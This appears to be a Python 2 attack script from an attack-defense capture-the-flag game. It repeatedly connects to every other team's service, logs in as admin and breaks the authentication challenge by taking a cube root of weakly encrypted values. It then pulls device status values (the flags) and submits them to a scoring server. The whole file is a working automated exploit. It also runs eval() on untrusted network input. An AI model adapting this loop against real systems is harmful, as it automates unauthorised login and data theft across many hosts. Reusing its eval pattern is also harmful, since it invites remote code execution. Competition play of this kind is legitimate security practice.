import gmpy
import hashlib
import socket
import sys
import time

import requests

debug = False
total = 0
while(1):
	_teams = requests.get('http://10.23.0.1/json/up').text.split('\n')[-4].split(':')[-1].strip().split(',')
	print "# of teams: {0}".format(len(_teams))
	for t in _teams:
		if t == '11': continue
		print >> sys.stderr, 'Attacking: 10.22.{t}.1'.format(t=t),
		s = socket.socket()
		try:
			s.connect(('10.22.{t}.1'.format(t=t), 21721))
			s.settimeout(10)
		except:
			print >> sys.stderr, 'Error: connection'
			if debug: print 'Challenge down?'
			continue


		try:
			s.recv(1024)
		except:
			print >> sys.stderr, 'Error: first receive'
			if debug: print 'Challenge down?'
			continue

		if debug: print 'Sending admin'
		s.send("admin\n")

		try:
			s.recv(1024)
		except:
			print >> sys.stderr, 'Error: ??'
			if debug: print 'Challenge down?'
			continue

		try:
			chal = s.recv(1024)

		except:
			print >> sys.stderr, 'Error: challenge'
			if debug: print 'Challenge down?'
			continue

		if debug: print chal
		try:
			challenge = int(chal.strip().replace('+OK Answer challenge; challenge=', ''))
			if debug: print 'Challenge received'
		except:
			print >> sys.stderr, 'Error: parse challenge'
			if debug: print 'Error in challenge received'
			continue

		if debug: print 'Cracking challenge...'
		c_gm = gmpy.mpz(challenge)
		message = int(c_gm.root(3)[0])

		sha = hashlib.sha256()
		sha.update(str(message))
		if debug: print 'Sending answer'
		s.send('answer={0}\n'.format(sha.hexdigest()))
		
		try:
			s.recv(1024)

		except:
			print >> sys.stderr, 'Error: answer challenge'
			if debug: print 'Challenge down?'
			continue

		if debug: print 'Getting consumers'
		s.send("listconsumers\n")

		try:
			s.recv(1024)
			tmp1 = s.recv(8192 * 8) # .strip().replace('devices=', ''))
			time.sleep(.5)
			tmp2 = s.recv(8192 * 8)
		except:
			print >> sys.stderr, 'Error: uuids'
			if debug: print 'Challenge down?'
			continue

		uuids = '{0}{1}'.format(tmp1, tmp2).strip().replace('+OK ; devices=', '').replace('>', '')

		try:
			uuids = eval(uuids)
		except:
			print >> sys.stderr, 'Error in uuids'
			continue

		# s.recv(1024)

		keys = []
		stati = []

		if debug: print 'Number found: {0}'.format(len(uuids))

		counter = 0

		for uuid in uuids[-10:]:
			# print >> sys.stderr, uuid
			s.send('readstatus {0}\n'.format(uuid))

			try:
				status = s.recv(1024).replace('+OK ; status_info=', '').strip()[2:-2].split(" ")[0].replace("status=", "")
				stati.append(status)
			except:
				print >> sys.stderr, 'Error: getting flag'
				if debug: print 'Challenge down?'
				continue
			time.sleep(.2)

			# counter += 1
			# print "\r", counter,
			# sys.stdout.flush()

		if debug: print '{t}: {s}'.format(t=t, s=stati)

		s.close()

		f = socket.socket()
		f.connect(('10.23.0.1', 1))
		if debug: print f.recv(1024)
		_pts = 0
		for _s in stati:
			if _s == '': continue
			f.send('{0}\n'.format(_s))
			# print >> sys.stderr, f.recv(1024)
			if ('Congratulations' in f.recv(1024)):
				_pts += 1
				total += 1
		print >> sys.stderr, '> {0}. Done'.format(_pts)

		print "Total Points: {0} ".format(total)
